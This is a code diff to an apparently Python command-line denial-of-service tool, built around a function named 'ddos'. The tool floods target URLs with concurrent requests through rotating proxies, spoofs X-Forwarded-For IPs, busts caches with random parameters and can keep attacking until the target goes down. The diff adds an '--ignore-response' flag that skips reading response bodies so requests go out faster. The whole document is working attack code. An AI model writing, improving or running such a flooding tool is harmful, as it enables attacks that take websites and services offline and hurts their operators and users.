@@ -26,7 +26,7 @@ STATS = defaultdict(int)
 URL_ERRORS_COUNT = defaultdict(int)
 
 
-async def make_request(url: str, proxy: str, timeout: int, headers: Dict[str, str]):
+async def make_request(url: str, proxy: str, timeout: int, headers: Dict[str, str], ignore_response: bool):
     timeout = aiohttp.ClientTimeout(total=timeout)
     logging.debug('Url: %s Proxy: %s header: %s', url, proxy, headers)
     try:
@@ -39,7 +39,8 @@ async def make_request(url: str, proxy: str, timeout: int, headers: Dict[str, st
 
         async with client_session as session:
             async with session.get(url, ssl=False) as response:
-                await response.text()
+                if not ignore_response:
+                    await response.text()
                 if response.status >= HTTPStatus.INTERNAL_SERVER_ERROR:
                     URL_ERRORS_COUNT[url] += 1
                 logging.info('Url: %s Proxy: %s Status: %s', url, proxy, response.status)
@@ -88,7 +89,8 @@ def make_headers(user_agent: str, random_xff_ip: bool, custom_headers: str) -> D
 
 async def ddos(
         target_url: str, timeout: int, count: int, proxy_iterator: Iterable[Tuple[str, str, int]],
-        with_random_get_param: bool, user_agent: str, random_xff_ip: bool, custom_headers: str, stop_attack: int
+        with_random_get_param: bool, user_agent: str, ignore_response: bool, random_xff_ip: bool, custom_headers: str,
+        stop_attack: int
 ):
     step = 0
     while True:
@@ -99,20 +101,21 @@ async def ddos(
         step += 1
         proxy = get_proxy(proxy_iterator)
         headers = make_headers(user_agent, random_xff_ip, custom_headers)
-        await make_request(prepare_url(target_url, with_random_get_param), proxy, timeout, headers)
-
+        await make_request(prepare_url(target_url, with_random_get_param), proxy, timeout, headers, ignore_response)
 
 
 async def amain(
         target_urls: List[str], timeout: int, concurrency: int, count: int, proxies: List[Tuple[str, str, int]],
-        with_random_get_param: bool, user_agent: str, random_xff_ip: bool, custom_headers: str, stop_attack: int
+        with_random_get_param: bool, user_agent: str, ignore_response: bool, random_xff_ip: bool, custom_headers: str,
+        stop_attack: int
 ):
     coroutines = []
     proxy_iterator = cycle(proxies or [])
     for target_url in target_urls:
         for _ in range(concurrency):
             coroutines.append(
-                ddos(target_url, timeout, count, proxy_iterator, with_random_get_param, user_agent, random_xff_ip,
+                ddos(target_url, timeout, count, proxy_iterator, with_random_get_param, user_agent, ignore_response,
+                     random_xff_ip,
                      custom_headers, stop_attack)
             )
     await asyncio.gather(*coroutines)
@@ -137,7 +140,7 @@ def load_targets(target_urls_file: str) -> List[str]:
 def process(
         target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
         concurrency: int, count: int, timeout: int, with_random_get_param: bool,
-        user_agent: str, verbose: bool, log_to_stdout: bool, random_xff_ip: bool,
+        user_agent: str, verbose: bool, ignore_response: bool, log_to_stdout: bool, random_xff_ip: bool,
         custom_headers: str, stop_attack: int
 ):
     config_logger(verbose, log_to_stdout)
@@ -149,8 +152,17 @@ def process(
         target_urls.append(target_url)
     loop = asyncio.get_event_loop()
     loop.run_until_complete(
-        amain(target_urls, timeout, concurrency, count, proxies, with_random_get_param, user_agent, random_xff_ip,
-              custom_headers, stop_attack)
+        amain(target_urls,
+              timeout,
+              concurrency,
+              count,
+              proxies,
+              with_random_get_param,
+              user_agent,
+              ignore_response,
+              random_xff_ip,
+              custom_headers,
+              stop_attack)
     )
     for key, value in STATS.items():
         if key != 'success':
@@ -167,6 +179,7 @@ def process(
 @click.option('--count', help='requests count (0 for infinite)', type=int, default=1)
 @click.option('--timeout', help='requests timeout', type=int, default=5)
 @click.option('--verbose', help='Show verbose log', is_flag=True, default=False)
+@click.option('--ignore-response', help='do not wait for response body', is_flag=True, default=False)
 @click.option('--with-random-get-param', help='add random get argument to prevent cache usage', is_flag=True, default=False)
 @click.option('--user-agent', help='custom user agent')
 @click.option('--log-to-stdout', help='log to console', is_flag=True)
@@ -176,7 +189,7 @@ def process(
 @click.option('--stop-attack', help='stop the attack when the target is down after N tries', type=int, default=0)
 def main(
         target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
-        concurrency: int, count: int, timeout: int, verbose: bool, with_random_get_param: bool,
+        concurrency: int, count: int, timeout: int, verbose: bool, ignore_response: bool, with_random_get_param: bool,
         user_agent: str, log_to_stdout: str, restart_period: int, random_xff_ip: bool, custom_headers: str,
         stop_attack: int
 ):
@@ -188,7 +201,7 @@ def main(
             target=process,
             args=(target_url, target_urls_file, proxy_url, proxy_file,
                   concurrency, count, timeout, with_random_get_param,
-                  user_agent, verbose, log_to_stdout, random_xff_ip, custom_headers,
+                  user_agent, verbose, ignore_response, log_to_stdout, random_xff_ip, custom_headers,
                   stop_attack)
         )
         proc.start()
